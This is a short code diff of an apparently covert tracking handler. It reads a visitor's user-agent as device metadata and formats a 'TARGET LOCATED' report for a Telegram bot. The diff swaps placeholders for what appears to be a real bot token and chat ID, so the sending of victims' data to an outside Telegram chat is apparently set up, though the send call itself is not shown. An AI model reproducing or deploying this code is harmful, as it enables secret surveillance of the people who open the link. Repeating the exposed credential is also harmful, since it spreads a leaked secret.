@@ -7,8 +7,8 @@ export default async function handler(req, res) {
       // Captures browser and device metadata
       const userAgent = req.headers['user-agent'] || 'Unknown Device';
       
-      const token = 'YOUR_TELEGRAM_BOT_TOKEN'; // Replace with your token
-      const chatId = 'YOUR_CHAT_ID';           // Replace with your ID
+      const token = '8999786868:AAE-U4z0bEc7U9URlYUCGTrqs5c5g-jRVFw'; // Replace with your token
+      const chatId = '8995886457';           // Replace with your ID
       
       // Formatting the message for Telegram
       const msg = `📍 TARGET LOCATED\n` +
